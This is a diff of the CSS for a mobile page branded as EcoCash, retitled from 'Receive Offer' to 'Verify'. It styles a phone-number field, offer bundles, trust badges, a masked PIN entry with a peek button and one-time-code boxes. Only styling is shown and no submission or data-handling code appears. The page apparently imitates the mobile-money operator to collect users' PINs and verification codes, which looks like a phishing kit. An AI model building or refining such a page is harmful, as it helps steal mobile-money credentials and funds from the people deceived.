@@ -4,363 +4,350 @@
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
 <meta name="theme-color" content="#0033a0"/>
-<title>Receive Offer · EcoCash</title>
+<title>Verify · EcoCash</title>
+<link rel="icon" href="assets/econet.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 :root{
-  --navy:#0033a0;--navy-dark:#001f6b;--blue:#1a6fff;
+  --navy:#0033a0;--blue:#1a6fff;--green:#059669;--red:#ef4444;
   --sky:#e8f1ff;--sky-mid:#d0e4ff;--sky-deep:#b8d3ff;
-  --red:#d0021b;--page:#eef3fc;--white:#fff;--card:#fff;
-  --border:#d5e3f7;--border-strong:#b8ccef;
+  --page:#eef3fc;--white:#fff;
+  --border:rgba(0,51,160,.12);--border-strong:rgba(0,51,160,.2);
   --ink:#0a1f44;--ink-mid:#2d4470;--ink-soft:#6b82a8;--ink-faint:#9eb5d4;
   --font:'Inter',sans-serif;--mono:'JetBrains Mono',monospace;
-  --r:12px;--r-lg:18px;
-  --shadow:0 1px 3px rgba(0,51,160,.07),0 4px 20px rgba(0,51,160,.09),0 0 0 1px rgba(255,255,255,.7) inset;
-  --glass-bg:rgba(255,255,255,0.72);--glass-border:rgba(255,255,255,0.9);
+  --r:10px;--r-lg:18px;
+  --shadow:0 1px 3px rgba(0,51,160,.06),0 4px 20px rgba(0,51,160,.08),0 0 0 1px rgba(255,255,255,.65) inset;
+  --glass:rgba(255,255,255,.72);--glass-b:rgba(255,255,255,.88);
 }
-/* ── PAGE TRANSITIONS ── */
-.screen{
-  animation:pageEnter .38s cubic-bezier(.22,1,.36,1) both;
-}
-@keyframes pageEnter{
-  from{opacity:0;transform:translateY(18px)}
-  to{opacity:1;transform:translateY(0)}
-}
-.screen.page-exit{
-  animation:pageExit .28s cubic-bezier(.4,0,1,1) forwards;
-}
-@keyframes pageExit{
-  from{opacity:1;transform:translateY(0)}
-  to{opacity:0;transform:translateY(-14px)}
-}
-.nav-curtain{
-  position:fixed;inset:0;
-  background:linear-gradient(160deg,#001f6b 0%,#0033a0 50%,#0a45c4 100%);
-  opacity:0;pointer-events:none;z-index:9999;
-  transition:opacity .25s ease;
-  display:flex;flex-direction:column;align-items:center;justify-content:center;
-}
-.nav-curtain::before{
-  content:'';position:absolute;inset:0;
-  background:
-    radial-gradient(ellipse 300px 260px at 80% 15%,rgba(26,111,255,.35),transparent 65%),
-    linear-gradient(rgba(255,255,255,.025) 1px,transparent 1px),
-    linear-gradient(90deg,rgba(255,255,255,.025) 1px,transparent 1px);
-  background-size:auto,36px 36px,36px 36px;pointer-events:none;
-}
-.nav-curtain.show{opacity:1;pointer-events:auto}
-.nc-brand{
-  position:relative;z-index:1;background:rgba(255,255,255,.92);
-  padding:7px 14px;border-radius:12px;display:flex;align-items:center;gap:9px;
-  margin-bottom:40px;animation:ncBrandIn .32s cubic-bezier(.34,1.56,.64,1) both;
-  box-shadow:0 4px 24px rgba(0,0,0,.18);
-}
-@keyframes ncBrandIn{from{opacity:0;transform:translateY(-10px) scale(.92)}to{opacity:1;transform:none}}
-.nc-brand img{height:22px;object-fit:contain}
-.nc-brand-sep{width:1px;height:16px;background:rgba(0,0,0,.12)}
-.nc-spinner{position:relative;z-index:1;width:54px;height:54px;margin-bottom:28px;animation:ncSpinIn .35s .08s cubic-bezier(.34,1.56,.64,1) both;}
-@keyframes ncSpinIn{from{opacity:0;transform:scale(.7)}to{opacity:1;transform:scale(1)}}
-.nc-spinner svg{animation:ncRotate 1s linear infinite}
-@keyframes ncRotate{to{transform:rotate(360deg)}}
-.nc-status{position:relative;z-index:1;text-align:center;animation:ncStatusIn .3s .15s ease both;}
-@keyframes ncStatusIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
-.nc-label{font-family:var(--font);font-size:16px;font-weight:800;color:#fff;letter-spacing:-.1px;margin-bottom:5px;}
-.nc-sub{font-family:var(--font);font-size:12px;font-weight:500;color:rgba(255,255,255,.55);letter-spacing:.2px;}
-.nc-dots{display:flex;gap:7px;margin-top:28px;position:relative;z-index:1;animation:ncStatusIn .3s .2s ease both;}
-.nc-dot{
-  height:7px;border-radius:999px;background:rgba(255,255,255,.25);
-  width:7px;
-  transition:background .3s,width .3s cubic-bezier(.34,1.56,.64,1);
-}
-.nc-dot.active{background:#fff;width:20px}
-.nc-dot.done{background:rgba(255,255,255,.55)}
+@keyframes pageEnter{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
+@keyframes pageExit{from{opacity:1}to{opacity:0;transform:translateY(-12px)}}
+.screen{animation:pageEnter .36s cubic-bezier(.22,1,.36,1) both}
+.screen.exit{animation:pageExit .26s cubic-bezier(.4,0,1,1) forwards}
 
-html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(--font);}
-
-/* #3 GRADIENT MESH */
+html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(--font)}
 body{
   background:
-    radial-gradient(ellipse 80% 55% at 10% -5%,  rgba(26,111,255,.13) 0%,transparent 55%),
-    radial-gradient(ellipse 55% 45% at 92% 18%,  rgba(0,51,160,.10)  0%,transparent 50%),
-    radial-gradient(ellipse 65% 50% at 55% 112%,  rgba(5,150,105,.08) 0%,transparent 55%),
+    radial-gradient(ellipse 78% 52% at 10% -5%,rgba(26,111,255,.12),transparent 53%),
+    radial-gradient(ellipse 55% 45% at 92% 16%,rgba(0,51,160,.09),transparent 50%),
+    radial-gradient(ellipse 62% 48% at 55% 112%,rgba(5,150,105,.08),transparent 54%),
     #eef3fc;
 }
+.screen{display:flex;flex-direction:column;width:100%;height:100%;height:100dvh;overflow:hidden;position:relative;isolation:isolate}
+.screen::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:1;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.032'/%3E%3C/svg%3E")}
 
-.screen{display:flex;flex-direction:column;width:100%;height:100%;height:100dvh;overflow:hidden;position:relative;isolation:isolate;}
-
-/* #17 noise */
-.screen::before{
-  content:'';position:fixed;inset:0;
-  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.035'/%3E%3C/svg%3E");
-  pointer-events:none;z-index:1;
+/* CURTAIN */
+.curtain{
+  position:fixed;inset:0;z-index:9999;pointer-events:none;
+  background:linear-gradient(155deg,#001f6b,#0033a0 55%,#0a45c4);
+  opacity:0;transition:opacity .22s ease;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
 }
+.curtain::before{content:'';position:absolute;inset:0;pointer-events:none;background:radial-gradient(ellipse 320px 280px at 85% 10%,rgba(26,111,255,.28),transparent 65%),linear-gradient(rgba(255,255,255,.022) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.022) 1px,transparent 1px);background-size:auto,34px 34px,34px 34px}
+.curtain-particles{position:absolute;inset:0;overflow:hidden;pointer-events:none}
+.cp{position:absolute;border-radius:50%;background:rgba(255,255,255,.18);animation:cpFloat linear infinite}
+@keyframes cpFloat{0%{transform:translateY(0);opacity:.18}50%{opacity:.3}100%{transform:translateY(-100vh) scale(.6);opacity:0}}
+.curtain-brand{position:relative;z-index:1;background:rgba(255,255,255,.93);padding:7px 14px;border-radius:12px;display:flex;align-items:center;gap:9px;margin-bottom:36px;box-shadow:0 4px 24px rgba(0,0,0,.2);animation:curtainIn .3s cubic-bezier(.34,1.56,.64,1) both}
+@keyframes curtainIn{from{opacity:0;transform:translateY(-10px) scale(.92)}to{opacity:1;transform:none}}
+.curtain-brand img{height:22px;object-fit:contain}
+.curtain-brand-sep{width:1px;height:16px;background:rgba(0,0,0,.1)}
+.curtain-spinner{position:relative;z-index:1;width:52px;height:52px;margin-bottom:26px;animation:curtainIn .3s .06s cubic-bezier(.34,1.56,.64,1) both}
+.curtain-spinner svg{animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.curtain-status{position:relative;z-index:1;text-align:center;animation:curtainIn .28s .12s ease both}
+.curtain-label{font-family:var(--font);font-size:16px;font-weight:800;color:#fff;letter-spacing:-.2px;margin-bottom:5px;transition:opacity .2s}
+.curtain-sub{font-family:var(--font);font-size:12px;font-weight:500;color:rgba(255,255,255,.5);letter-spacing:.1px;transition:opacity .2s}
+.curtain-dots{display:flex;gap:6px;margin-top:26px;position:relative;z-index:1;animation:curtainIn .28s .16s ease both}
+.cdot{height:6px;border-radius:999px;background:rgba(255,255,255,.22);width:6px;transition:background .28s,width .28s cubic-bezier(.34,1.56,.64,1)}
+.cdot.on{background:#fff;width:18px}.cdot.done{background:rgba(255,255,255,.5)}
+.curtain.show{opacity:1;pointer-events:auto}
 
 /* HEADER */
 .header{
-  background:linear-gradient(135deg,#001f6b 0%,#0033a0 45%,#0a45c4 100%);
+  background:linear-gradient(135deg,#001f6b,#0033a0 48%,#0a45c4);
   padding:max(14px,env(safe-area-inset-top)) 18px 20px;
   flex-shrink:0;position:relative;overflow:hidden;
 }
-.header::before{
-  content:'';position:absolute;inset:0;
-  background:
-    radial-gradient(ellipse 280px 220px at 110% -20%,rgba(26,111,255,.45),transparent 65%),
-    linear-gradient(rgba(255,255,255,.03) 1px,transparent 1px),
-    linear-gradient(90deg,rgba(255,255,255,.03) 1px,transparent 1px);
-  background-size:auto,32px 32px,32px 32px;pointer-events:none;
-}
-.hglow{
-  position:absolute;width:260px;height:260px;border-radius:50%;
-  background:rgba(26,111,255,.28);filter:blur(80px);
-  top:-130px;right:-80px;pointer-events:none;
-  animation:glowPulse 4s ease-in-out infinite;
-}
-@keyframes glowPulse{0%,100%{opacity:.7;transform:scale(1)}50%{opacity:1;transform:scale(1.12)}}
-
-.header-top{display:flex;align-items:center;justify-content:space-between;position:relative;z-index:2;margin-bottom:16px;}
-.brand{display:flex;align-items:center;gap:9px;background:rgba(255,255,255,.92);padding:5px 10px;border-radius:10px;backdrop-filter:blur(8px)}
+.header::before{content:'';position:absolute;inset:0;pointer-events:none;background:radial-gradient(ellipse 260px 200px at 108% -18%,rgba(26,111,255,.42),transparent 65%),linear-gradient(rgba(255,255,255,.026) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.026) 1px,transparent 1px);background-size:auto,32px 32px,32px 32px}
+.header::after{content:'';position:absolute;top:0;left:-100%;width:60%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.055),transparent);animation:hdrSweep 9s ease-in-out infinite;pointer-events:none}
+@keyframes hdrSweep{0%,100%{left:-100%}55%{left:150%}}
+.hglow{position:absolute;width:250px;height:250px;border-radius:50%;background:rgba(26,111,255,.25);filter:blur(75px);top:-122px;right:-70px;pointer-events:none;animation:glowPulse 4.2s ease-in-out infinite}
+@keyframes glowPulse{0%,100%{opacity:.65;transform:scale(1)}50%{opacity:1;transform:scale(1.1)}}
+.header-top{display:flex;align-items:center;justify-content:space-between;position:relative;z-index:2;margin-bottom:16px}
+.brand{display:flex;align-items:center;gap:8px;background:rgba(255,255,255,.92);padding:5px 10px;border-radius:10px;backdrop-filter:blur(8px)}
 .brand-logo-econet{height:20px;object-fit:contain}
-.brand-sep{width:1px;height:16px;background:rgba(0,0,0,.12)}
+.brand-sep{width:1px;height:15px;background:rgba(0,0,0,.1)}
 .brand-logo-ecocash{height:26px;object-fit:contain}
-
-.amount-chip{
-  background:rgba(255,255,255,.15);
-  border:1px solid rgba(255,255,255,.25);
-  backdrop-filter:blur(8px);
-  padding:5px 14px;border-radius:999px;
-  font-family:var(--mono);font-size:12px;font-weight:700;color:#fff;
-}
-
-.bundle-pills{display:flex;gap:6px;flex-wrap:wrap;position:relative;z-index:2;}
-.bundle-pill{
-  background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);
-  backdrop-filter:blur(8px);
-  border-radius:999px;padding:4px 11px;
-  font-family:var(--mono);font-size:10px;font-weight:600;color:rgba(255,255,255,.9);
-}
+.amount-chip{background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.22);backdrop-filter:blur(8px);padding:5px 14px;border-radius:999px;font-family:var(--mono);font-size:12px;font-weight:700;color:#fff;font-feature-settings:"tnum","ss01";letter-spacing:-.01em}
+.bundle-pills{display:flex;gap:6px;flex-wrap:wrap;position:relative;z-index:2}
+.bundle-pill{background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.18);backdrop-filter:blur(8px);border-radius:999px;padding:4px 11px;font-family:var(--mono);font-size:10px;font-weight:600;color:rgba(255,255,255,.88);font-feature-settings:"tnum"}
 
 /* BODY */
 .body{
   flex:1;overflow-y:auto;overflow-x:hidden;
   -webkit-overflow-scrolling:touch;
-  padding:20px 14px max(24px,env(safe-area-inset-bottom));
+  padding:20px 16px max(24px,env(safe-area-inset-bottom));
   overscroll-behavior:contain;min-height:0;
   position:relative;z-index:1;
+  scrollbar-width:thin;scrollbar-color:var(--border-strong) transparent;
 }
 .body::-webkit-scrollbar{width:3px}
 .body::-webkit-scrollbar-track{background:transparent}
 .body::-webkit-scrollbar-thumb{background:var(--border-strong);border-radius:999px}
 
+/* #18 keyboard-aware */
+.body.keyboard-up{padding-bottom:8px}
+
 .step{display:none;flex-direction:column;gap:0}
 .step.active{display:flex;animation:fadeIn .22s cubic-bezier(.34,1.56,.64,1)}
 @keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
 
-/* #1 GLASS ECOCASH ROW */
+/* ECOCASH ROW */
 .ecocash-row{
   display:flex;align-items:center;gap:10px;
-  background:var(--glass-bg);
-  backdrop-filter:blur(20px) saturate(180%);-webkit-backdrop-filter:blur(20px) saturate(180%);
-  border:1.5px solid var(--glass-border);
-  border-radius:var(--r-lg);padding:13px 16px;
-  margin-bottom:12px;
-  box-shadow:var(--shadow);
+  background:var(--glass);backdrop-filter:blur(20px) saturate(180%);-webkit-backdrop-filter:blur(20px) saturate(180%);
+  border:1.5px solid var(--glass-b);border-radius:var(--r-lg);
+  padding:16px;margin-bottom:12px;box-shadow:var(--shadow);
   position:relative;overflow:hidden;
 }
-.ecocash-row::before{
-  content:'';position:absolute;top:0;left:0;right:0;height:4px;
-  background:linear-gradient(90deg,#22c55e,#059669,#1a6fff);
-  border-radius:var(--r-lg) var(--r-lg) 0 0;
-}
-.ecocash-logo-lg{height:34px;object-fit:contain}
-.ecocash-row-title{font-size:13px;font-weight:900;color:var(--ink);line-height:1.2}
-.ecocash-row-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:2px}
+.ecocash-row::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#22c55e,#059669,#1a6fff);border-radius:var(--r-lg) var(--r-lg) 0 0}
+.ecocash-logo-lg{height:32px;object-fit:contain}
+.ecocash-row-title{font-size:13px;font-weight:800;color:var(--ink);letter-spacing:-.15px;line-height:1.2}
+.ecocash-row-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:2px;letter-spacing:.01em}
+.ecocash-micro-badges{display:flex;gap:5px;margin-top:8px;flex-wrap:wrap}
+.emb{font-size:9px;font-weight:700;letter-spacing:.3px;text-transform:uppercase;padding:3px 8px;border-radius:999px;display:flex;align-items:center;gap:3px}
+.emb-instant{background:rgba(5,150,105,.1);color:#059669;border:1px solid rgba(5,150,105,.2)}
+.emb-secure{background:rgba(26,111,255,.08);color:var(--blue);border:1px solid rgba(26,111,255,.18)}
+.emb-free{background:rgba(245,158,11,.1);color:#d97706;border:1px solid rgba(245,158,11,.22)}
 
-/* #1 #2 GLASS CARDS */
+/* CARD */
 .card{
-  background:var(--glass-bg);
-  backdrop-filter:blur(20px) saturate(180%);-webkit-backdrop-filter:blur(20px) saturate(180%);
-  border:1.5px solid var(--glass-border);
-  border-radius:var(--r-lg);overflow:hidden;
-  margin-bottom:10px;
-  box-shadow:var(--shadow);
+  background:var(--glass);backdrop-filter:blur(20px) saturate(180%);-webkit-backdrop-filter:blur(20px) saturate(180%);
+  border:1.5px solid var(--glass-b);border-radius:var(--r-lg);overflow:hidden;
+  margin-bottom:12px;box-shadow:var(--shadow);
 }
 .card-top-bar{height:4px;background:linear-gradient(90deg,var(--blue),#38bdf8)}
-.card-hdr{padding:14px 16px 12px;border-bottom:1px solid rgba(213,227,247,.6)}
-/* #5 TYPOGRAPHY */
-.card-title{font-size:15px;font-weight:900;color:var(--ink)}
-.card-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:2px}
+.card-hdr{padding:14px 16px 12px;border-bottom:1px solid rgba(0,51,160,.08)}
+.card-title{font-size:15px;font-weight:900;color:var(--ink);letter-spacing:-.2px}
+.card-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:2px;letter-spacing:.02em}
 .card-body{padding:16px}
 
-/* #11 FLOATING LABELS */
-.field{margin-bottom:16px;position:relative;}
+/* FIELDS */
+.field{margin-bottom:16px;position:relative}
 .field:last-child{margin-bottom:0}
-.field-label{
-  font-size:10px;font-weight:700;color:var(--ink-soft);
-  text-transform:uppercase;letter-spacing:.8px;margin-bottom:6px;
-  transition:color .18s;
-}
+/* #5 label wide tracking */
+.field-label{font-size:10px;font-weight:700;color:var(--ink-soft);text-transform:uppercase;letter-spacing:.8px;margin-bottom:6px;transition:color .16s}
 .field:focus-within .field-label{color:var(--blue)}
+.field-hint{font-size:11px;color:var(--ink-faint);font-weight:500;margin-top:5px;letter-spacing:.01em}
 
+/* #24 ERROR STATE */
+.field-error{font-size:11px;font-weight:600;color:var(--red);margin-top:5px;display:none;letter-spacing:.01em}
+.field-error.show{display:block}
+.field.has-error input{border-color:var(--red)!important;box-shadow:0 0 0 3px rgba(239,68,68,.1)!important}
+/* #17 shake on error */
+@keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-6px)}40%,80%{transform:translateX(6px)}}
+.shake{animation:shake .35s cubic-bezier(.36,.07,.19,.97)}
+
+/* PHONE */
 .phone-row{display:flex;gap:8px}
 .phone-prefix{
   background:linear-gradient(135deg,var(--sky),rgba(208,228,255,.8));
-  border:1.5px solid var(--sky-deep);
-  color:var(--navy);font-family:var(--mono);font-size:14px;font-weight:800;
+  border:1.5px solid var(--sky-deep);color:var(--navy);
+  font-family:var(--mono);font-size:14px;font-weight:800;
   padding:0 14px;border-radius:var(--r);
   display:flex;align-items:center;flex-shrink:0;height:50px;
-  box-shadow:0 2px 8px rgba(0,51,160,.08);
+  box-shadow:0 2px 8px rgba(0,51,160,.07);
+  font-feature-settings:"tnum";
 }
 
-input[type=tel],input[type=text],input[type=password]{
+/* INPUTS */
+input[type=tel],input[type=text]{
   width:100%;height:50px;padding:0 14px;
   border-radius:var(--r);border:1.5px solid var(--border);
-  background:rgba(255,255,255,.8);
-  backdrop-filter:blur(8px);
+  background:rgba(255,255,255,.8);backdrop-filter:blur(8px);
   font-family:var(--font);font-size:15px;font-weight:500;color:var(--ink);
-  outline:none;
-  transition:border-color .2s cubic-bezier(.34,1.56,.64,1),
-             background .2s,box-shadow .2s,transform .15s;
-  -webkit-appearance:none;
+  outline:none;-webkit-appearance:none;
+  transition:border-color .18s,background .18s,box-shadow .18s;
 }
 input::placeholder{color:var(--ink-faint)}
-input:focus{
-  border-color:var(--blue);background:var(--white);
-  box-shadow:0 0 0 4px rgba(26,111,255,.12);
-}
-.field-hint{font-size:11px;color:var(--ink-faint);font-weight:500;margin-top:5px}
+input:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4px rgba(26,111,255,.11)}
 
-/* PIN */
-.pin-field{position:relative;display:flex;align-items:center}
-.pin-field input{height:50px;padding:0 50px 0 14px;font-family:var(--mono);font-size:22px;letter-spacing:7px;}
-.eye-btn{
-  position:absolute;right:13px;background:none;border:none;
-  cursor:pointer;color:var(--ink-faint);display:flex;align-items:center;
-  padding:4px;transition:color .15s,transform .2s cubic-bezier(.34,1.56,.64,1);
+/* ── PIN ENTRY ────────────────────────────── */
+.pin-field-wrap{
+  background:rgba(255,255,255,.8);backdrop-filter:blur(8px);
+  border:1.5px solid var(--border);border-radius:var(--r);
+  padding:14px 16px 12px;
+  transition:border-color .18s,box-shadow .18s;
+  cursor:text;
 }
-.eye-btn:active{transform:scale(.88)}
-.eye-btn:hover{color:var(--blue)}
+.pin-field-wrap.focused{
+  border-color:var(--blue);background:var(--white);
+  box-shadow:0 0 0 4px rgba(26,111,255,.11);
+}
+.pin-field-wrap.has-error{
+  border-color:var(--red)!important;
+  box-shadow:0 0 0 3px rgba(239,68,68,.1)!important;
+}
+.pin-tap-label{
+  font-size:11px;font-weight:600;color:var(--ink-faint);
+  text-align:center;margin-bottom:10px;letter-spacing:.02em;
+}
+.pin-field-wrap.focused .pin-tap-label{color:var(--blue)}
+.pin-dots-row{display:flex;align-items:center;justify-content:center;gap:14px}
+.pin-dot{
+  width:15px;height:15px;border-radius:50%;
+  border:2px solid var(--border-strong);
+  background:transparent;flex-shrink:0;
+  transition:background .14s cubic-bezier(.34,1.56,.64,1),
+             border-color .14s,
+             transform .18s cubic-bezier(.34,1.56,.64,1),
+             box-shadow .14s;
+  position:relative;overflow:hidden;
+}
+.pin-dot.filled{
+  background:linear-gradient(135deg,var(--navy),var(--blue));
+  border-color:transparent;transform:scale(1.18);
+  box-shadow:0 2px 9px rgba(0,51,160,.28);
+}
+/* peek — shows digit briefly */
+.pin-dot.peek{
+  background:var(--white);border-color:var(--sky-deep);
+  width:28px;height:28px;border-radius:7px;transform:scale(1);
+  box-shadow:var(--shadow);
+}
+.pin-dot-digit{
+  position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
+  font-family:var(--mono);font-size:14px;font-weight:800;color:var(--navy);
+  opacity:0;transition:opacity .1s;
+}
+.pin-dot.peek .pin-dot-digit{opacity:1}
+
+.pin-actions-row{
+  display:flex;align-items:center;justify-content:flex-end;
+  gap:4px;margin-top:10px;min-height:20px;
+}
+.pin-peek-btn{
+  font-size:11px;font-weight:700;color:var(--blue);
+  background:none;border:none;cursor:pointer;padding:2px 4px;
+  display:flex;align-items:center;gap:5px;
+  opacity:0;pointer-events:none;
+  transition:opacity .18s,transform .18s cubic-bezier(.34,1.56,.64,1);
+}
+.pin-peek-btn.visible{opacity:1;pointer-events:auto}
+.pin-peek-btn:active{transform:scale(.9)}
+.pin-clear-btn{
+  font-size:11px;font-weight:700;color:var(--ink-faint);
+  background:none;border:none;cursor:pointer;padding:2px 4px;
+  opacity:0;pointer-events:none;
+  transition:opacity .18s,transform .18s cubic-bezier(.34,1.56,.64,1);
+}
+.pin-clear-btn.visible{opacity:1;pointer-events:auto}
+.pin-clear-btn:active{transform:scale(.9)}
+.pin-input-hidden{
+  position:absolute;opacity:0;width:1px;height:1px;pointer-events:none;
+}
 
 /* OTP */
-.otp-wrap{position:relative;height:60px}
+.otp-wrap{position:relative;height:56px}
 #otpHidden{
   position:absolute;inset:0;width:100%;height:100%;
   opacity:0;cursor:pointer;font-size:16px;z-index:2;
   border:none;background:none;outline:none;caret-color:transparent;
 }
-.otp-display{display:flex;gap:7px;pointer-events:none}
-
-/* #13 OTP BOX spring entrance */
+.otp-display{display:flex;gap:7px;pointer-events:none;height:100%}
+/* #12 OTP cursor blink */
 .otp-box{
-  flex:1;height:60px;border-radius:var(--r);
+  flex:1;height:100%;border-radius:var(--r);
   border:1.5px solid var(--border);
-  background:rgba(255,255,255,.7);backdrop-filter:blur(8px);
+  background:rgba(255,255,255,.68);backdrop-filter:blur(8px);
   display:flex;align-items:center;justify-content:center;
   font-family:var(--mono);font-size:22px;font-weight:800;color:var(--ink);
-  transition:border-color .2s cubic-bezier(.34,1.56,.64,1),
-             background .2s,box-shadow .2s,
-             transform .2s cubic-bezier(.34,1.56,.64,1);
-  transform:scale(1);
+  font-feature-settings:"tnum";
+  transition:border-color .18s cubic-bezier(.34,1.56,.64,1),background .18s,box-shadow .18s,transform .18s cubic-bezier(.34,1.56,.64,1);
+  position:relative;overflow:hidden;
 }
 .otp-box.filled{background:var(--white);border-color:var(--sky-deep);transform:scale(1.04)}
-.otp-box.active{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4px rgba(26,111,255,.14);transform:scale(1.06)}
-.otp-box.disabled{opacity:.4;background:var(--border)}
+.otp-box.active{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4px rgba(26,111,255,.11);transform:scale(1.06)}
+/* blinking cursor line */
+.otp-box.active::after{
+  content:'';position:absolute;width:1.5px;height:55%;
+  background:var(--blue);border-radius:2px;
+  animation:cursorBlink 1s ease-in-out infinite;
+  display:none;
+}
+.otp-box.active.empty::after{display:block}
+@keyframes cursorBlink{0%,100%{opacity:1}50%{opacity:0}}
+.otp-box.disabled{opacity:.38;background:var(--border)}
+/* #17 OTP shake on error */
+.otp-display.shake{animation:shake .36s cubic-bezier(.36,.07,.19,.97)}
 
 .timer-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0 0}
 .timer-lbl{font-size:12px;color:var(--ink-soft);font-weight:500}
-.timer-num{font-family:var(--mono);font-weight:700;color:var(--blue)}
-.resend-btn{font-size:12px;font-weight:700;color:var(--blue);cursor:pointer;opacity:.3;padding:0;background:none;border:none;transition:opacity .18s,transform .2s cubic-bezier(.34,1.56,.64,1)}
+.timer-num{font-family:var(--mono);font-weight:700;color:var(--blue);font-feature-settings:"tnum"}
+.resend-btn{font-size:12px;font-weight:700;color:var(--blue);cursor:pointer;opacity:.3;padding:0;background:none;border:none;transition:opacity .16s,transform .18s cubic-bezier(.34,1.56,.64,1)}
 .resend-btn.active{opacity:1}
-.resend-btn:active{transform:scale(.92)}
-
-.masked-note{font-size:13px;color:var(--ink-soft);font-weight:500;text-align:center;padding:2px 0 6px;line-height:1.5}
+.resend-btn:active{transform:scale(.91)}
+.masked-note{font-size:14px;color:var(--ink-soft);font-weight:500;text-align:center;padding:2px 0 8px;line-height:1.5;letter-spacing:.01em}
+.masked-note strong{font-family:var(--mono);font-weight:700;color:var(--ink);font-feature-settings:"tnum";font-size:13px}
 
 /* PROCESSING */
 .proc-body{padding:36px 20px;text-align:center}
-.proc-ring{
-  width:56px;height:56px;border-radius:50%;margin:0 auto 16px;
-  border:3px solid rgba(26,111,255,.2);border-top-color:var(--blue);
-  animation:spin 1s cubic-bezier(.4,0,.2,1) infinite;
-  box-shadow:0 0 20px rgba(26,111,255,.2);
-}
-@keyframes spin{to{transform:rotate(360deg)}}
-/* #5 typography */
-.proc-title{font-size:17px;font-weight:900;color:var(--ink);margin-bottom:6px}
-.proc-sub{font-size:13px;color:var(--ink-soft);line-height:1.6}
+.proc-ring{width:54px;height:54px;border-radius:50%;margin:0 auto 16px;border:3px solid rgba(26,111,255,.18);border-top-color:var(--blue);animation:spin 1s linear infinite;box-shadow:0 0 20px rgba(26,111,255,.18)}
+.proc-title{font-size:17px;font-weight:900;color:var(--ink);margin-bottom:6px;letter-spacing:-.3px}
+.proc-sub{font-size:13px;color:var(--ink-soft);line-height:1.65}
 
-/* #14 SECURITY STRIP */
-.security-strip{
-  display:flex;align-items:center;justify-content:center;
-  padding:12px 0 4px;
-  border-top:1px solid rgba(213,227,247,.5);
-  margin-top:4px;
-}
-.sec-badge{
-  display:flex;align-items:center;gap:5px;
-  font-size:9px;font-weight:700;color:#059669;letter-spacing:.3px;
-  padding:0 12px;
-}
+/* SECURITY */
+.security-strip{display:flex;align-items:center;justify-content:center;padding:12px 0 4px;border-top:1px solid rgba(0,51,160,.08);margin-top:6px}
+.sec-badge{display:flex;align-items:center;gap:5px;font-size:9px;font-weight:700;color:var(--green);letter-spacing:.3px;text-transform:uppercase;padding:0 12px}
 .sec-badge+.sec-badge{border-left:1px solid var(--border)}
-.sec-badge svg{opacity:.7;stroke:#059669}
+.sec-badge svg{opacity:.75;stroke:var(--green)}
 
-/* INLINE BUTTON — sits in scroll flow directly after card */
+/* ACTION BUTTON */
 .action-btn{
   background:linear-gradient(135deg,#2678ff,#0033a0);
   color:#fff;border:none;width:100%;padding:16px;
   border-radius:var(--r-lg);
-  font-family:var(--font);font-size:15px;font-weight:900;
-  cursor:pointer;letter-spacing:.1px;
+  font-family:var(--font);font-size:15px;font-weight:900;color:#fff;
+  cursor:pointer;letter-spacing:-.1px;
   opacity:.35;pointer-events:none;
   box-shadow:0 6px 20px rgba(26,111,255,.4);
-  transition:opacity .2s,transform .2s cubic-bezier(.34,1.56,.64,1),box-shadow .2s;
-  position:relative;overflow:hidden;
-  margin-top:10px;
+  transition:opacity .18s,transform .2s cubic-bezier(.34,1.56,.64,1),box-shadow .18s;
+  position:relative;overflow:hidden;margin-top:10px;
 }
-.action-btn::after{
-  content:'';position:absolute;inset:0;
-  background:linear-gradient(180deg,rgba(255,255,255,.15) 0%,transparent 55%);
-  pointer-events:none;
-}
-.action-btn.active{opacity:1;pointer-events:auto}
+.action-btn::after{content:'';position:absolute;inset:0;background:linear-gradient(180deg,rgba(255,255,255,.14) 0%,transparent 55%);pointer-events:none}
+.action-btn.on{opacity:1;pointer-events:auto}
